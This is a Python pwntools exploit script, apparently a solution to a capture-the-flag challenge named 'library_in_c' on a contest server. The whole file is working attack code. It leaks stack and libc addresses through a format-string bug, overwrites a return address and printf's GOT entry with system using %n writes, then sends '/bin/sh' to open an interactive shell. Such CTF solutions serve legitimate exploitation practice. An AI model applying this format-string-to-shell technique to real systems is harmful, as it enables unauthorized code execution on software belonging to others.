from pwn import *


#p=process("./library_in_c")
p=remote("shell.actf.co",20201)
p.recvuntil("your name?")
p.sendline("%15$llx-%27$llx")
p.recvline()
data=p.recvline()[len("Why hello there "):-1]
print data
data=data.split("-")
libc_start_main=int(data[1],16)
print "libc :",hex(libc_start_main)
pop_rdi=0x00000000004008f3
ret=0x00000000004005d6
base=libc_start_main-0x20830
system=base+0x045390
binsh=base+0x18cd57
eip=int(data[0],16)-(3*8)
print "eip :",hex(eip)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
printf_got=0x601030
first=system&0xffffffff
main=0x400660
payload=""
payload+="%"+str(main)+"x"
payload+="%20$lln"
payload+="A"*(32-len(payload))
payload+=p64(eip)
p.sendline(payload)

print "printing :",first
print "hex rep:",hex(first)
print len(hex(first))
if len(hex(first)) <=9 and first <= 0x9000000:
    payload=""
    payload+="%"+str(first)+"x"
    payload+="%12$n"
    payload+="A"*(32-len(payload))
    payload+=p64(printf_got)
    pause()
    p.sendline(payload)
    p.sendline("/bin/sh")
    p.interactive()
#0x7fffffffb590-0x7fffffffdcd8











